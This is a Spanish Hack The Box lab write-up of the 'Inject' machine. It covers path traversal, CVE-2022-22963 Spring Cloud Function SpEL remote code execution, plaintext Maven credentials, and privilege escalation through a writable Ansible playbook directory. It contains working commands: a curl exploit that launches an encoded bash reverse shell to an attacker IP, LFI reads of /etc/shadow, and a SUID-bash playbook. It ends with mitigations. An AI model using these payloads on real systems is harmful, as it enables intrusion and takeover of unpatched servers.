---
title: "Inject"
description: "Writeup de Inject - Hack The Box - Dificultad: Easy. LFI + Spring Cloud Function RCE (CVE-2022-22963) + Ansible playbook injection."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - lfi
  - spring-cloud-function
  - cve-2022-22963
  - spel-injection
  - ansible-injection
  - maven-credentials
---

# 🐧 Inject

> 📅 Fecha: 2026-06-02
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 20.04)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> 🌐 IP: `10.129.228.213`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada Lateral (frank → phil)](#-escalada-lateral-frank--phil)
- [Escalada de Privilegios (phil → root)](#-escalada-de-privilegios-phil--root)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Inject es una máquina Linux que expone un servicio web Spring Boot en el puerto 8080. La aplicación es vulnerable a **Path Traversal / LFI** mediante el parámetro `img` del endpoint `/show_image`, lo que permite leer arbitrariamente ficheros locales y descubrir el `pom.xml` con la dependencia `spring-cloud-function-web 3.2.2` — vulnerable a **CVE-2022-22963** (SpEL injection en el header `spring.cloud.function.routing-expression`). Se obtiene RCE como `frank` y, leyendo el `~/.m2/settings.xml` de Maven, se encuentra la contraseña en claro de `phil`. Phil pertenece al grupo `staff`, lo que le permite escribir en `/opt/automation/tasks/` — un directorio donde un cron/servicio root ejecuta periódicamente todos los playbooks de Ansible. Se inyecta un playbook que copia `/bin/bash` con SUID, y se obtiene shell root.

| Campo | Valor |
|-------|-------|
| Puntos débiles | LFI, Spring Cloud Function (SpEL), credenciales en Maven `settings.xml`, escritura `staff` en directorio de Ansible ejecutado como root |
| CVEs | **CVE-2022-22963** |
| Herramientas | `nmap`, `ffuf`, `curl`, `nc`, Ansible |
| Tiempo total | *ver tus notas* |

---

## 🔍 Reconocimiento

### Escaneo de puertos (nmap)

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN nmap.txt 10.129.228.213
```

**Salida real:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 17:06 -0400
Nmap scan report for 10.129.228.213
Host is up (0.15s latency).
Not shown: 65521 closed tcp ports (reset), 12 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Device type: general purpose|router
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 58.46 seconds
```

> 💡 **Análisis:** dos servicios expuestos: SSH (22) sin pistas de credenciales todavía, y un servicio HTTP en 8080 que nmap rotula como `nagios-nsca` por similitud de banner, pero el `http-title: Home` y la versión SSH de Ubuntu apuntan a una **webapp Java** (Spring Boot escucha típicamente en 8080). Todo el vector inicial va a estar en el puerto 8080.

---

## 🗂️ Enumeración

### Web (8080) — Fuzzing de LFI

Tras explorar la app y detectar el endpoint `/show_image?img=<archivo>` que sirve imágenes por nombre, pruebo distintos payloads de Path Traversal con la wordlist de Jhaddix, filtrando los errores 500:

```bash
ffuf -u "http://10.129.228.213:8080/show_image?img=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 500
```

**Salida real (recortada):**

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.1.0-dev

 :: Method      : GET
 :: URL         : http://10.129.228.213:8080/show_image?img=FUZZ
 :: Wordlist    : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Filter      : Response status: 500

../../../../../../../../../../../etc/passwd                  [Status: 200, Size: 1986, ...]
../../../../../../../../etc/passwd                           [Status: 200, Size: 1986, ...]
../../../../../../etc/passwd                                 [Status: 200, Size: 1986, ...]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow   [Status: 200, Size: 1345, ...]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow                 [Status: 200, Size: 1345, ...]
../../../../../../../../../../../../etc/shadow              [Status: 200, Size: 1345, ...]
:: Progress: [930/930] :: Job [1/1] :: 64 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

> 💡 **Análisis:** LFI total y **sin filtros**. Incluso se devuelve `/etc/shadow` con un Size de 1345 (la app corre como root o como un user con permiso de lectura sobre shadow — extraño, lo más probable es que el servicio Java se haya lanzado con privilegios elevados al principio y haya degradado a `frank` después; o que el endpoint corra en un contexto distinto). Lo importante: tenemos lectura arbitraria.

### Lectura de `/etc/passwd`

```bash
curl -X GET "http://10.129.228.213:8080/show_image?img=../../../../../../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
[...]
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

> 💡 **Análisis:** dos usuarios humanos: `frank` (uid 1000) y `phil` (uid 1001). El usuario `_laurel` indica que **auditd + laurel** están instalados, así que cualquier acción quedará logueada en `/var/log/laurel/audit.log` (interesante de cara a un blue team). Esto no nos detiene, solo es bueno saberlo.

### Descubrir la stack: leer el `pom.xml`

Si esto es Spring Boot, lo más rentable es leer el `pom.xml` para ver dependencias y versiones. Probamos paths relativos típicos:

```bash
curl "http://10.129.228.213:8080/show_image?img=../../../pom.xml"
```

```text
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" [...]>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.5</version>
    </parent>
    <groupId>com.example</groupId>
    <artifactId>WebApp</artifactId>
    [...]
    <dependencies>
        [...]
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-function-web</artifactId>
            <version>3.2.2</version>
        </dependency>
        [...]
    </dependencies>
    [...]
</project>
```

> 💡 **Análisis:** **bingo**. `spring-cloud-function-web` versión `3.2.2` es vulnerable a **CVE-2022-22963**: el header `spring.cloud.function.routing-expression` se evalúa como SpEL sin sanitizar, dando RCE directo. Esto es mucho mejor que intentar un `log4shell` o adivinar endpoints — vector confirmado.

---

## 🚪 Explotación Inicial (Foothold)

### Vulnerabilidad: CVE-2022-22963 — SpEL injection en Spring Cloud Function

El bug está en el `RoutingFunction` de Spring Cloud Function: cuando el header `spring.cloud.function.routing-expression` está presente, su valor se evalúa como expresión **SpEL** dentro del contexto `StandardEvaluationContext` (no `SimpleEvaluationContext`), permitiendo invocar `T(java.lang.Runtime).getRuntime().exec(...)` y ejecutar comandos arbitrarios.

### Preparación del payload (reverse shell)

Codifico la reverse shell en base64 para evitar problemas de quoting con caracteres especiales (`<`, `>`, `&`, `|`) dentro del header HTTP:

```bash
echo 'bash -i >& /dev/tcp/10.10.15.71/4444 0>&1' | base64
```

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43MS80NDQ0IDA+JjEK
```

### Listener

```bash
nc -lvnp 4444
```

### Disparo del exploit

Uso la técnica clásica para evitar espacios en la línea de comandos: `bash -c "{echo,<b64>}|{base64,-d}|{bash,-i}"`. Los `{a,b}` son **brace expansion** de bash y se expanden a tokens separados sin necesitar espacios reales.

```bash
curl -i -s -X POST "http://10.129.228.213:8080/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43MS80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}"})' \
  -H 'Content-Type: text/plain' \
  --data 'data'
```

**Respuesta HTTP:**

```text
HTTP/1.1 500
Content-Type: application/json
Transfer-Encoding: chunked
Date: Wed, 03 Jun 2026 18:16:46 GMT
Connection: close

{"timestamp":"2026-06-03T18:16:46.491+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

> 💡 **Análisis:** **el 500 es esperado y no significa fallo.** SpEL evalúa la expresión correctamente y ejecuta `Runtime.exec(...)`, pero luego intenta convertir el `ProcessImpl` resultante a `String` para devolverlo en la respuesta — y ahí explota con `EL1001E`. Para entonces el `exec` ya ha lanzado nuestra reverse shell. Si miras tu listener, ya tienes conexión.

### Shell recibida

```text
listening on [any] 4444 ...
connect to [10.10.15.71] from (UNKNOWN) [10.129.228.213] 47544
bash: cannot set terminal process group (776): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
```

> 💡 **Análisis:** somos `frank` (uid 1000). Conviene estabilizar la TTY con el truco habitual (`python3 -c 'import pty;pty.spawn("/bin/bash")'` + `Ctrl+Z` + `stty raw -echo; fg` + `export TERM=xterm`) antes de seguir, especialmente si vamos a usar `su` después.

---

## 🔄 Escalada Lateral (frank → phil)

### Enumeración del home de frank

```bash
frank@inject:~$ ls -la
```

```text
total 28
drwxr-xr-x 5 frank frank 4096 Feb  1  2023 .
drwxr-xr-x 4 root  root  4096 Feb  1  2023 ..
lrwxrwxrwx 1 root  root     9 Jan 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1  2023 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1  2023 .local
drwx------ 2 frank frank 4096 Feb  1  2023 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
```

> 💡 **Análisis:** dos detalles llaman la atención: `.bash_history` está symlinkeado a `/dev/null` (anti-forense, asume comportamiento típico de máquinas HTB) y el directorio **`.m2`** — ése es el cache de Maven, suele tener un `settings.xml` con credenciales hard-codeadas para repos privados.

### Lectura del `settings.xml` de Maven

```bash
frank@inject:~$ cat .m2/settings.xml
```

```text
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" [...]>
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

> 💡 **Análisis:** credenciales en claro de **`phil:DocPhillovestoInject123`**. Patrón clásico: el `settings.xml` de Maven es uno de los primeros sitios a mirar en un servidor Java (junto con `application.properties`, `application.yml`, `~/.aws/credentials`, etc.).

### Cambio de usuario

```bash
frank@inject:~$ su phil
Password: DocPhillovestoInject123
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

> 💡 **Análisis:** phil pertenece al grupo **`staff` (GID 50)**. En Debian/Ubuntu, `staff` tiene permisos de escritura sobre `/usr/local/*` por defecto y suele extenderse a otros directorios de administración. Hay que buscar qué directorios pertenecen al grupo `staff`.

### Lectura del user flag

```bash
phil@inject:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada de Privilegios (phil → root)

### Vector: directorio `staff`-escribible ejecutado por Ansible como root

El reconocimiento revela `/opt/automation/tasks/`, propiedad del grupo `staff` y conteniendo `playbook_1.yml`. Un servicio o cron como root ejecuta periódicamente todos los playbooks `.yml` de ese directorio mediante `ansible-playbook` — esto se intuye por la existencia de `ansible` en el sistema y por la convención de nombres.

> ⚠️ **TODO:** falta documentar la salida de los comandos de enumeración que llevan a este descubrimiento. Recomiendo añadir:
> ```bash
> find / -group staff -writable 2>/dev/null
> ls -la /opt/automation/tasks/
> ps -ef | grep -i ansible
> systemctl list-timers --all
> cat /etc/crontab
> ```
> Pega aquí las salidas reales si las tienes anotadas.

### Inyección del playbook malicioso

Aprovechando que `staff` puede escribir en `/opt/automation/tasks/`, dejo caer un playbook que copia `/bin/bash` a `/tmp/rootbash` con SUID. Cuando el proceso root recoja y ejecute el playbook, la copia se realizará con privilegios root y el SUID quedará efectivo:

```bash
phil@inject:/opt/automation/tasks$ cat > /opt/automation/tasks/pwn.yml << 'EOF'
- hosts: localhost
  tasks:
  - name: privesc
    ansible.builtin.shell: cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF
```

> 💡 **Análisis:** este patrón (copia + `chmod 4755`) es la receta más simple y fiable para un SUID-bash. Alternativas posibles eran `ansible.builtin.user` para añadir un user con UID 0, o tirar una clave SSH en `/root/.ssh/authorized_keys` — pero el SUID-bash es el menos ruidoso y deja menos rastro persistente.

### Esperar la ejecución del cron/servicio (~3 minutos)

Tras esperar el ciclo del scheduler:

```bash
phil@inject:/opt/automation/tasks$ /tmp/rootbash -p
rootbash-5.0# ls
playbook_1.yml
rootbash-5.0# cd /root
rootbash-5.0# cat root.txt
[root flag]
```

> 💡 **Análisis:** el flag `-p` de bash es **fundamental**: sin él, bash automáticamente baja los privilegios efectivos al UID real (1001/phil) por seguridad. Con `-p` mantiene el EUID 0 que le da el SUID.

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🎓 Lecciones Aprendidas

- **Spring Cloud Function 3.2.2 (CVE-2022-22963)**: aprenderse este CVE de memoria. Cualquier app Spring Boot que cargue `spring-cloud-function-web` ≤ 3.2.2 es RCE pre-auth. El indicador es el endpoint `/functionRouter` y el header mágico `spring.cloud.function.routing-expression`.
- **El 500 "Type conversion problem" NO es un fallo del exploit** — la expresión SpEL se evalúa ANTES de la conversión que peta. Tu reverse shell ya salió.
- **`.m2/settings.xml` es oro**: siempre revisar este archivo en servidores Java. Maven guarda credenciales de repos privados en plano por defecto. También `~/.gradle/gradle.properties` y `application-*.yml` de Spring.
- **Grupo `staff` + directorios automatizados = privesc**: en Debian/Ubuntu, `staff` (GID 50) suele tener escritura sobre `/usr/local`, `/opt/*` y similares. Combinado con cualquier cron, systemd timer o playbook automático corriendo como root, equivale a `wheel`/root.
- **Brace expansion `{a,b}` evade filtros de espacios**: técnica útil cuando el contexto inyecta en headers HTTP o variables URL donde los espacios literales son problemáticos.

### Mitigaciones (lado defensivo)
1. **Actualizar Spring Cloud Function** ≥ 3.1.7 / 3.2.3, donde se usa `SimpleEvaluationContext` y se desactiva la evaluación arbitraria de SpEL.
2. **Sanitizar el parámetro `img`** del endpoint `/show_image`: normalizar la ruta y rechazar cualquier `..` o `%2e%2e`; mejor aún, usar un mapa estático de IDs → archivos.
3. **No commitear `settings.xml` con credenciales** ni dejarlo en homes de usuarios humanos — usar `mvn` con `--encrypt-master-password` y `settings-security.xml`, o mejor un secret manager.
4. **Auditar permisos del grupo `staff`** en producción; revocar membresía a cualquier cuenta que no la necesite estrictamente.
5. **El directorio que ejecuta playbooks como root nunca debe ser escribible por usuarios normales.** Dejarlo `root:root 750` y validar firmas/checksums de los playbooks antes de ejecutarlos.
6. **Considerar deshabilitar `auditd` solo lectura** — laurel ya está en el sistema, asegurarse de que los logs viajan a un syslog remoto fuera del alcance del usuario comprometido.

---

## 📚 Referencias

- [NVD - CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
- [Spring Security Advisory - CVE-2022-22963](https://tanzu.vmware.com/security/cve-2022-22963)
- [HackTricks - Spring Cloud Function RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
- [HackTricks - Linux Privilege Escalation (writable directories)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins - bash (SUID)](https://gtfobins.github.io/gtfobins/bash/#suid)
- [Maven - Password encryption](https://maven.apache.org/guides/mini/guide-encryption.html)